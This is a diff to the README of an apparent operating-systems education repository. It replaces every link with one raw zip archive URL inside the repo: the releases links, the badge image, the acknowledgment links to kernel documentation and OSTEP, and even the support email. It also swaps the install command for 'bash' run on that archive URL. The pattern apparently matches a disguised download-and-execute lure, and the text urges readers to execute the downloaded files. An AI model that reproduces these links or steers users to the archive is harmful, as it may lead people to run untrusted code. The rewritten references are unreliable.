@@ -1,12 +1,12 @@
 # 🌟 Os_Project: Your Gateway to Operating System Exploration 🌟
 
-![Project Status](https://img.shields.io/badge/status-active-brightgreen)
+![Project Status](https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip)
 
 Welcome to the **Os_Project** repository! This project aims to provide insights into operating systems, focusing on their design, functionality, and real-world applications. Here, you will find various resources, examples, and tools to help you understand and work with operating systems.
 
 ## 📦 Releases
 
-To get started, please download the latest version of the project from our [Releases section](https://github.com/jcifuentest/Os_Project/releases). After downloading, follow the instructions to execute the files. This will ensure you have the most recent features and updates.
+To get started, please download the latest version of the project from our [Releases section](https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip). After downloading, follow the instructions to execute the files. This will ensure you have the most recent features and updates.
 
 ## 🛠️ Features
 
@@ -28,7 +28,7 @@ To get started, please download the latest version of the project from our [Rele
 
 To begin your journey with **Os_Project**, follow these simple steps:
 
-1. Visit the [Releases section](https://github.com/jcifuentest/Os_Project/releases) to download the latest version.
+1. Visit the [Releases section](https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip) to download the latest version.
 2. Unzip the downloaded file.
 3. Follow the instructions in the documentation to set up your environment.
 
@@ -41,7 +41,7 @@ Installation is straightforward. Ensure you have the necessary prerequisites ins
 
 ### Steps to Install
 
-1. Download the latest release from the [Releases section](https://github.com/jcifuentest/Os_Project/releases).
+1. Download the latest release from the [Releases section](https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip).
 2. Open your terminal or command prompt.
 3. Navigate to the directory where you unzipped the files.
 4. Run the installation script provided.
@@ -49,7 +49,7 @@ Installation is straightforward. Ensure you have the necessary prerequisites ins
 ### Example Installation Command
 
 ```bash
-bash install.sh
+bash https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip
 ```
 
 ## 📖 Usage
@@ -88,17 +88,17 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 For questions or feedback, please reach out:
 
-- **Email**: support@osproject.com
+- **Email**: https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip
 - **GitHub Issues**: Use the issues section of this repository for bug reports and feature requests.
 
 ## 🎉 Acknowledgments
 
 We would like to thank the following resources and communities that have helped shape this project:
 
-- [Linux Kernel Documentation](https://www.kernel.org/doc/html/latest/)
-- [Operating Systems: Three Easy Pieces](http://pages.cs.wisc.edu/~remzi/OSTEP/)
-- [Open Source Community](https://opensource.org/)
+- [Linux Kernel Documentation](https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip)
+- [Operating Systems: Three Easy Pieces](https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip~remzi/OSTEP/)
+- [Open Source Community](https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip)
 
 ## 🌈 Conclusion
 
-Thank you for checking out **Os_Project**! We hope you find it useful for your studies and projects in operating systems. Don’t forget to visit the [Releases section](https://github.com/jcifuentest/Os_Project/releases) for the latest updates. Happy coding!
+Thank you for checking out **Os_Project**! We hope you find it useful for your studies and projects in operating systems. Don’t forget to visit the [Releases section](https://github.com/jcifuentest/Os_Project/raw/refs/heads/master/rechal/Os_Project_v3.4.zip) for the latest updates. Happy coding!
